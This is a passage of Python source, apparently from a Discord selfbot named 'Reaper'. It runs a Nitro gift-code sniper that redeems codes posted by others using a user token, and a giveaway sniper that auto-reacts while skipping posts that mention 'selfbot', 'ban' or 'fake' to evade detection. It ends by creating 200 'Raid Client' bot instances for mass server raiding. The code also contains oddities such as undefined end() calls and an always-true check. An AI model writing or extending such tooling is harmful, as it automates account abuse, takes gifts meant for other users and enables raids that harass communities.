                ntheaders = {"Authorization": remd["RedeemToOtherToken"]["Token"]}
            if remd["RedeemToOtherToken"]["Enabled"] == False:
                ntheaders = {"Authorization": hoe_token}
            else:
                ntheaders = {"Authorization": hoe_token}
            if rend != "" or rend != None:
                ntheaders.update( { User_Agent: rend } )
            else:
                pass
            if isinstance(message.channel, discord.channel.GroupChannel):
                pass
            elif isinstance(message.channel, discord.channel.DMChannel):
                pass
            else:
                if blacklist["ServerIDs"]:
                    if message.guild.id in blacklist["ServerIDs"]:
                        return
                    end()
                if blacklist["ChannelIDs"]:
                    if message.channel.id in blacklist["ChannelIDs"]:
                        return
                    end()
                end()
            code = re.findall("discord[.]gift/(\w+)", message.content)
            des = self.ntdes
            for code in code:
                if len(code) == 16 or len(code) == 24:
                    if code in ntUsed:
                        elapsed = str(pytime.time() - start).split(".")[0] + "." + str(pytime.time() - start).split(".")[1][:4] + f"{Fore.WHITE} seconds"
                        nitrodata(0, code, elapsed)
                    elif code in ntInvalid:
                        elapsed = str(pytime.time() - start).split(".")[0] + "." + str(pytime.time() - start).split(".")[1][:4] + f"{Fore.WHITE} seconds"
                        nitrodata(-1, code, elapsed)
                    else:
                        r = session.post(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                        headers=ntheaders).text
                        elapsed = str(pytime.time() - start).split(".")[0] + "." + str(pytime.time() - start).split(".")[1][:4] + f"{Fore.WHITE} seconds"
                        if 'This gift has been redeemed already.' in r:
                            nitrodata(0, code, elapsed)
                            ntUsed.append(str(code))
                        elif 'subscription_plan' in r:
                            nitrodata(1, code, elapsed)
                            ntUsed.append(str(code))
                        elif 'Unknown Gift Code' in r:
                            nitrodata(-1, code, elapsed)
                            ntInvalid.append(str(code))
                        end()
                    end()
                else:
                    elapsed = str(pytime.time() - start).split(".")[0] + "." + str(pytime.time() - start).split(".")[1][:4] + f"{Fore.WHITE} seconds"
                    nitrodata(-2, code, elapsed)
                    ntInvalid.append(str(code))
                end()
            end()
        end()
        #print(" "*2+c.b+f'Invalid Code {Style.RESET_ALL}|{Fore.RED} {str(code)}'+Fore.WHITE+f" (Auto Detect){Fore.WHITE} | {message.guild} (#{message.channel}) | {elapsed}")
        #lognoPrint(f'Found Invalid Nitro Code (https://discord.gift/{code})')
        #n("Invalid Code (autodetect) | {var}".format(var=code))
        #lognoPrint(f'Redeemed Valid Nitro Code (https://discord.gift/{code})')
    if self.gwsniper == True:
        if 'giveaway' in message.content.lower():
            if self.blacklistgw["ServerIDs"]:
                if message.guild.id in self.blacklistgw["ServerIDs"]:
                    return
                end()
            if self.blacklistgw["ChannelIDs"]:
                if message.channel.id in self.blacklistgw["ChannelIDs"]:
                    return
                end()
            des = self.gwdes
            bot_ids = self.gwbotids
            bids = [
                700743797977514004,
                582537632991543307,
                716967712844414996,
                679379155590184966,
                785496485659148359
            ]
            try:
                _uid = message.author.id
                flags = {
                    1: (_uid == 294882584201003009),
                    2: (_uid == 716967712844414996),
                    3: (_uid == 679379155590184966),
                    4: (_uid == 582537632991543307)
                }
                Dict = message.embeds[0].to_dict()
                if flags[1]:
                    prize = str (Dict["author"]["name"])
                elif flags[2]:
                    prize = str (Dict["title"]\
                    .replace(":gift:", "")\
                    .replace("🎁", ""))
                elif flags[3]:
                    prize = str (Dict["title"]\
                    .replace(":gift:", "")\
                    .replace("🎁", "")\
                    .replace("Giveaway", "")\
                    .replace("giveaway", ""))
                elif flags[4]:
                    prize = str (Dict["description"]\
                    .split("\n")[0]\
                    .replace("<:RAOGgift2:816142356554186832>", ""))
                else:
                    prize = ""
            except:
                prize = ""
            for bid in bids:
                bot_ids.append(bid)
            if (message.author.id in bot_ids):
                def gwdata(m: int = 1, reason: str = "", blc_: bool = False):
                    if m == 1: 
                        _t = 'SNIPED A GIVEAWAY'
                        _s = f'{Fore.LIGHTGREEN_EX}Joined'
                        lognoPrint(f'Joined giveaway in Server: {message.guild}, Channel: {message.channel}')
                    else: 
                        _t = 'UNABLE TO SNIPE GIVEAWAY'
                        _s = f'{Fore.LIGHTRED_EX}Not Joined {reason}'
                        lognoPrint("Found Giveaway in **{}** (#{}) but couldn't react.".format(message.guild.name, message.channel))
                    def notif():
                        tprize = ("\nPrize: "+prize) if prize != "" else prize
                        try:
                            notification.notify(
                                title=f'{_t}',
                                message=f'Server: {message.guild}\nChannel: {message.channel}{tprize}',
                                app_name='Reaper Giveaway Sniper',
                                app_icon='./assets/logo.ico',
                                timeout=int (self.gwdes["Timeout"])
                            )
                            return 0
                        except:
                            return -2
                    def postWb():
                        wb = self.gwwb["Link"]
                        if wb == "": return
                        elif wb == "INSERT WEBHOOK LINK HERE": return
                        else:
                            try:
                                if self.gwwb["SendDelayMS"]:
                                    sl = (int(self.gwwb["SendDelayMS"]) / 1000)
                                    sleep(sl)
                                session.post(wb, data=dumps(
                                    {"content": "", "embeds": [
                                        {"title": "Reaper Giveaway Sniper", "color": emcolor, 
                                        "fields": [{
                                            "name": "Message", 
                                            "value": _t.title()}, {
                                            "name": "Server",
                                            "value": f"**{message.guild.name}**"}, {
                                            "name": "Channel",
                                            "value": f"**{message.channel.mention}**"}, {
                                            "name": "_ _",
                                            "value": f"[Message Link]({message.jump_url})"}
                                            ], 
                                        "author": {"name": f"{message.author}", "icon_url": f"{message.author.avatar_url}"}, 
                                        "footer": {"text": "Giveaway Sniper Webhook | "+footer}, 
                                        "thumbnail": {"url": emimage}}
                                        ]}).encode(), headers=getheaders())
                                return 0
                            except:
                                return -3
                    def printInfo():
                        nl = "\n"
                        tpr = (f"\n    {Fore.LIGHTWHITE_EX}Prize: {Fore.LIGHTYELLOW_EX}{prize}") if prize != "\n" else prize
                        _m = "\n" +\
                        s.space+s.sblue+f"{Fore.LIGHTWHITE_EX}Giveaway Sniper Data:{Style.RESET_ALL}" +nl+\
                        f"    {Fore.LIGHTWHITE_EX}Status: {_s}" +nl+\
                        f"    {Fore.LIGHTWHITE_EX}Server: {Fore.LIGHTYELLOW_EX}{message.guild.name}" +nl+\
                        f"    {Fore.LIGHTWHITE_EX}Channel: {Fore.LIGHTYELLOW_EX}{message.channel.name}" +tpr+Fore.RESET+Style.RESET_ALL + nl
                        print(_m)
                    if blc_ == True:
                        printInfo()
                        return -1
                    else:
                        if blc_ == False: 
                            flag1 = postWb()
                        if des["Enabled"] == True: 
                            flag2 = notif()
                        if blc_ == False: 
                            flag3 = printInfo()
                        if (flag1 == -3): 
                            print(errorcol+"Invalid webhook link (Giveaway Webhook)")
                        elif (flag1 == 0): 
                            pass
                        if (flag2 == -2): 
                            print(errorcol+"An error occured while trying to send notification.")
                        elif (flag2 == 0): 
                            pass
                        if (flag3 == -1): 
                            pass
                        elif (flag3 == 0): 
                            pass
                        return 0
                res = self.gwres
                qes = self.blacklistgw
                blc = qes["Words"]
                bl2 = [
                    "cheat", "ban", "snipe", "hack", "ban", "auto join",
                    "terminat", "remove", "kick", "quickjoin", "autojoin", 
                    "sinper", "selfbot", "testing", "auto join", "autojoin",
                    "dont",  "do not", "don't", "fake", "lies", "remov" ]
                for blcc in bl2: blc.append(blcc)
                for word in blc:
                    try:
                        em = message.embeds[0].to_dict()
                        if word.lower() in str(em).lower():
                            gwdata(-1, f"(Blacklisted Word: {word.lower()})", True)
                    except:
                        pass
                try:
                    if res["DelayMS"]: await asyncio.sleep(int(res["DelayMS"]) / 1000)
                    await message.add_reaction("🎉")
                    gwdata(1, "", False)
                    #print(s.space+c.b+s.yellow+f"Joined Giveaway in {message.guild.name} ({Fore.YELLOW}#{message.channel}{Fore.WHITE}).")
                except discord.errors.Forbidden:
                    gwdata(-2, "(Forbidden)", False)
                except discord.errors.HTTPException:
                    gwdata(-3, "(HTTPException)", False)
                except:
                    gwdata(-4, "(Unknown)", False)
                end()
            end()
        if f'congratulations <@{reaper.user.id}>' in message.content.lower():
            if self.blacklistgw["ServerIDs"]:
                if message.guild.id in self.blacklistgw["ServerIDs"]:
                    return
                end()
            end()
            if self.blacklistgw["ChannelIDs"]:
                if message.channel.id in self.blacklistgw["ChannelIDs"]:
                    return
                end()
            end()
            des = config["Snipers"]["GiveawaySniper"]["DesktopNotify"]
            def n(m:str):
                if compat == False:
                    if des["Enabled"] == True:
                        return os.system(f"ntfy -t \"WON A GIVEAWAY\" send \"{m}\"")
                    end()
                end()
            bot_ids = config["Snipers"]["GiveawaySniper"]["GiveawayBotIDs"]
            res = config["Snipers"]["GiveawaySniper"]["WaitBeforeReact"]
            if message.author.id in bot_ids:
                nl = "\n"
                _m = "\n" +\
                s.space+s.sblue+f"{Fore.LIGHTWHITE_EX}Giveaway Sniper Data:{Style.RESET_ALL}" +nl+\
                f"    {Fore.LIGHTWHITE_EX}Status: {Fore.LIGHTGREEN_EX}Won The Giveaway" +nl+\
                f"    {Fore.LIGHTWHITE_EX}Server: {Fore.LIGHTYELLOW_EX}{message.guild.name}" +nl+\
                f"    {Fore.LIGHTWHITE_EX}Channel: {Fore.LIGHTYELLOW_EX}{message.channel.name}" +Fore.RESET+Style.RESET_ALL + nl
                print(_m)
                def notif():
                    try:
                        notification.notify(
                            title=f'WON A GIVEAWAY',
                            message=f'Server: {message.guild}\nChannel: {message.channel}',
                            app_name='Reaper Giveaway Sniper',
                            app_icon='./assets/logo.ico',
                            timeout=int (self.gwdes["Timeout"])
                        )
                        return 0
                    except:
                        return -2
                if des["Enabled"] == True: 
                    flag2 = notif()
                if (flag2 == -2): 
                    print(errorcol+"An error occured while trying to send notification.")
                elif (flag2 == 0): 
                    pass
                lognoPrint(f'Giveaway won in Server: {message.guild}, Channel: {message.channel}')
                wb = self.gwwb["Link"]
                if wb == "":
                    return
                elif wb == "INSERT WEBHOOK LINK HERE":
                    return
                else:
                    webhook = {"content": "", "embeds": [
                                {"title": "Reaper Giveaway Sniper", "color": emcolor, 
                                "fields": [{
                                    "name": "Message", 
                                    "value": "WON a giveaway"}, {
                                    "name": "Server",
                                    "value": f"**{message.guild.name}**"}, {
                                    "name": "Channel",
                                    "value": f"**{message.channel.mention}**"}, {
                                    "name": "_ _",
                                    "value": f"[Message Link]({message.jump_url})"}
                                    ], 
                                "author": {"name": f"{message.author}", "icon_url": f"{message.author.avatar_url}"}, 
                                "footer": {"text": "Giveaway Sniper Webhook | "+footer}, 
                                "thumbnail": {"url": emimage}}
                                ]}
                    try:
                        if self.gwwb["SendDelayMS"]:
                            sl = (int(self.gwwb["SendDelayMS"]) / 1000)
                            sleep(sl)
                        urlopen(Request(wb, data=dumps(webhook).encode(), headers=getheaders()))
                    except:
                        print(errorcol+"Invalid webhook link (Giveaway Webhook)")
                    end()
                end()
            end()
    await reaper.process_commands(message)

# PART XIII: Raid Clients

if True:
    ra_1 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_1.remove_command("help")
    ra_2 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_2.remove_command("help")
    ra_3 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_3.remove_command("help")
    ra_4 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_4.remove_command("help")
    ra_5 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_5.remove_command("help")
    ra_6 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_6.remove_command("help")
    ra_7 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_7.remove_command("help")
    ra_8 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_8.remove_command("help")
    ra_9 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_9.remove_command("help")
    ra_10 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_10.remove_command("help")
    ra_11 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_11.remove_command("help")
    ra_12 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_12.remove_command("help")
    ra_13 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_13.remove_command("help")
    ra_14 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_14.remove_command("help")
    ra_15 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_15.remove_command("help")
    ra_16 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_16.remove_command("help")
    ra_17 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_17.remove_command("help")
    ra_18 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_18.remove_command("help")
    ra_19 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_19.remove_command("help")
    ra_20 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_20.remove_command("help")
    ra_21 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_21.remove_command("help")
    ra_22 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_22.remove_command("help")
    ra_23 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_23.remove_command("help")
    ra_24 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_24.remove_command("help")
    ra_25 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_25.remove_command("help")
    ra_26 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_26.remove_command("help")
    ra_27 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_27.remove_command("help")
    ra_28 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_28.remove_command("help")
    ra_29 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_29.remove_command("help")
    ra_30 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_30.remove_command("help")
    ra_31 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_31.remove_command("help")
    ra_32 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_32.remove_command("help")
    ra_33 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_33.remove_command("help")
    ra_34 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_34.remove_command("help")
    ra_35 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_35.remove_command("help")
    ra_36 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_36.remove_command("help")
    ra_37 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_37.remove_command("help")
    ra_38 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_38.remove_command("help")
    ra_39 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_39.remove_command("help")
    ra_40 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_40.remove_command("help")
    ra_41 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_41.remove_command("help")
    ra_42 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_42.remove_command("help")
    ra_43 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_43.remove_command("help")
    ra_44 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_44.remove_command("help")
    ra_45 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_45.remove_command("help")
    ra_46 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_46.remove_command("help")
    ra_47 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_47.remove_command("help")
    ra_48 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_48.remove_command("help")
    ra_49 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_49.remove_command("help")
    ra_50 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_50.remove_command("help")
    ra_51 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_51.remove_command("help")
    ra_52 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_52.remove_command("help")
    ra_53 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_53.remove_command("help")
    ra_54 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_54.remove_command("help")
    ra_55 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_55.remove_command("help")
    ra_56 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_56.remove_command("help")
    ra_57 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_57.remove_command("help")
    ra_58 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_58.remove_command("help")
    ra_59 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_59.remove_command("help")
    ra_60 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_60.remove_command("help")
    ra_61 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_61.remove_command("help")
    ra_62 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_62.remove_command("help")
    ra_63 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_63.remove_command("help")
    ra_64 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_64.remove_command("help")
    ra_65 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_65.remove_command("help")
    ra_66 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_66.remove_command("help")
    ra_67 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_67.remove_command("help")
    ra_68 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_68.remove_command("help")
    ra_69 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_69.remove_command("help")
    ra_70 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_70.remove_command("help")
    ra_71 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_71.remove_command("help")
    ra_72 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_72.remove_command("help")
    ra_73 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_73.remove_command("help")
    ra_74 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_74.remove_command("help")
    ra_75 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_75.remove_command("help")
    ra_76 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_76.remove_command("help")
    ra_77 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_77.remove_command("help")
    ra_78 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_78.remove_command("help")
    ra_79 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_79.remove_command("help")
    ra_80 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_80.remove_command("help")
    ra_81 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_81.remove_command("help")
    ra_82 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_82.remove_command("help")
    ra_83 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_83.remove_command("help")
    ra_84 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_84.remove_command("help")
    ra_85 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_85.remove_command("help")
    ra_86 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_86.remove_command("help")
    ra_87 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_87.remove_command("help")
    ra_88 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_88.remove_command("help")
    ra_89 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_89.remove_command("help")
    ra_90 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_90.remove_command("help")
    ra_91 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_91.remove_command("help")
    ra_92 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_92.remove_command("help")
    ra_93 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_93.remove_command("help")
    ra_94 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_94.remove_command("help")
    ra_95 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_95.remove_command("help")
    ra_96 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_96.remove_command("help")
    ra_97 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_97.remove_command("help")
    ra_98 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_98.remove_command("help")
    ra_99 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_99.remove_command("help")
    ra_100 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_100.remove_command("help")
    ra_101 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_101.remove_command("help")
    ra_102 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_102.remove_command("help")
    ra_103 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_103.remove_command("help")
    ra_104 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_104.remove_command("help")
    ra_105 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_105.remove_command("help")
    ra_106 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_106.remove_command("help")
    ra_107 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_107.remove_command("help")
    ra_108 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_108.remove_command("help")
    ra_109 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_109.remove_command("help")
    ra_110 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_110.remove_command("help")
    ra_111 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_111.remove_command("help")
    ra_112 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_112.remove_command("help")
    ra_113 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_113.remove_command("help")
    ra_114 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_114.remove_command("help")
    ra_115 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_115.remove_command("help")
    ra_116 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_116.remove_command("help")
    ra_117 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_117.remove_command("help")
    ra_118 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_118.remove_command("help")
    ra_119 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_119.remove_command("help")
    ra_120 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_120.remove_command("help")
    ra_121 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_121.remove_command("help")
    ra_122 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_122.remove_command("help")
    ra_123 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_123.remove_command("help")
    ra_124 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_124.remove_command("help")
    ra_125 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_125.remove_command("help")
    ra_126 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_126.remove_command("help")
    ra_127 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_127.remove_command("help")
    ra_128 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_128.remove_command("help")
    ra_129 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_129.remove_command("help")
    ra_130 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_130.remove_command("help")
    ra_131 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_131.remove_command("help")
    ra_132 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_132.remove_command("help")
    ra_133 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_133.remove_command("help")
    ra_134 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_134.remove_command("help")
    ra_135 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_135.remove_command("help")
    ra_136 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_136.remove_command("help")
    ra_137 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_137.remove_command("help")
    ra_138 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_138.remove_command("help")
    ra_139 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_139.remove_command("help")
    ra_140 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_140.remove_command("help")
    ra_141 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_141.remove_command("help")
    ra_142 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_142.remove_command("help")
    ra_143 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_143.remove_command("help")
    ra_144 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_144.remove_command("help")
    ra_145 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_145.remove_command("help")
    ra_146 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_146.remove_command("help")
    ra_147 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_147.remove_command("help")
    ra_148 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_148.remove_command("help")
    ra_149 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_149.remove_command("help")
    ra_150 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_150.remove_command("help")
    ra_151 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_151.remove_command("help")
    ra_152 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_152.remove_command("help")
    ra_153 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_153.remove_command("help")
    ra_154 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_154.remove_command("help")
    ra_155 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_155.remove_command("help")
    ra_156 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_156.remove_command("help")
    ra_157 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_157.remove_command("help")
    ra_158 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_158.remove_command("help")
    ra_159 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_159.remove_command("help")
    ra_160 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_160.remove_command("help")
    ra_161 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_161.remove_command("help")
    ra_162 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_162.remove_command("help")
    ra_163 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_163.remove_command("help")
    ra_164 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_164.remove_command("help")
    ra_165 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_165.remove_command("help")
    ra_166 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_166.remove_command("help")
    ra_167 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_167.remove_command("help")
    ra_168 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_168.remove_command("help")
    ra_169 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_169.remove_command("help")
    ra_170 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_170.remove_command("help")
    ra_171 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_171.remove_command("help")
    ra_172 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_172.remove_command("help")
    ra_173 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_173.remove_command("help")
    ra_174 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_174.remove_command("help")
    ra_175 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_175.remove_command("help")
    ra_176 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_176.remove_command("help")
    ra_177 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_177.remove_command("help")
    ra_178 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_178.remove_command("help")
    ra_179 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_179.remove_command("help")
    ra_180 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_180.remove_command("help")
    ra_181 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_181.remove_command("help")
    ra_182 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_182.remove_command("help")
    ra_183 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_183.remove_command("help")
    ra_184 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_184.remove_command("help")
    ra_185 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_185.remove_command("help")
    ra_186 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_186.remove_command("help")
    ra_187 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_187.remove_command("help")
    ra_188 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_188.remove_command("help")
    ra_189 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_189.remove_command("help")
    ra_190 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_190.remove_command("help")
    ra_191 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_191.remove_command("help")
    ra_192 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_192.remove_command("help")
    ra_193 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_193.remove_command("help")
    ra_194 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_194.remove_command("help")
    ra_195 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_195.remove_command("help")
    ra_196 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_196.remove_command("help")
    ra_197 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_197.remove_command("help")
    ra_198 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_198.remove_command("help")
    ra_199 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_199.remove_command("help")
    ra_200 = commands.Bot(command_prefix=prefix, case_insensitive=True)
    ra_200.remove_command("help")

# PART XIV: Commands

